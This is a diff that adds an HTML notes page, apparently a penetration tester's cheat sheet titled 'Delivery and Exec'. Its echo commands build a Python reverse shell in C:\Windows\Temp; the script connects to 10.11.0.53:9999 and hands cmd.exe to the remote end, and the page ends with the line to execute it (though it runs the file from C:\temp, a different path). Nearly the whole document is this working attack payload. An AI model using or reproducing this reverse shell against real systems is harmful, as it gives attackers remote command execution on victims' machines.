@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Delivery and Exec</title>
+</head><body>Older systems: C:\temp<br/>
+Otherwise try: C:\Windows\Temp<br/>
+<br/>
+echo(&#09;&#09;is for a blank line<br/>
+^ &#09;&#09;&#09;is an escape char for cmd<br/>
+<br/>
+@echo off<br/>
+echo import os,socket,subprocess,threading; &gt; C:\Windows\Temp\me.py<br/>
+echo def s2p(s, p): &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; while True: &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; &nbsp; &nbsp; data = s.recv(1024) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; &nbsp; &nbsp; if len(data) ^&gt; 0: &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p.stdin.write(data) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &nbsp;&gt;&gt; C:\Windows\Temp\me.py<br/>
+echo def p2s(s, p): &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; while True: &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; &nbsp; &nbsp; s.send(p.stdout.read(1)) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo s.connect(('10.11.0.53',9999)) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &nbsp;&gt;&gt; C:\Windows\Temp\me.py<br/>
+echo p=subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo s2p_thread = threading.Thread(target=s2p, args=[s, p]) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo s2p_thread.daemon = True &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo s2p_thread.start() &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo p2s_thread = threading.Thread(target=p2s, args=[s, p]) &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo p2s_thread.daemon = True &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo p2s_thread.start() &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo( &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo try: &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; p.wait() &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo except KeyboardInterrupt: &gt;&gt; C:\Windows\Temp\me.py<br/>
+echo &nbsp; &nbsp; s.close() &gt;&gt; C:\Windows\Temp\me.py<br/>
+@echo on<br/>
+<br/>
+C:\Python26\python.exe C:\temp\me.py</body></html>
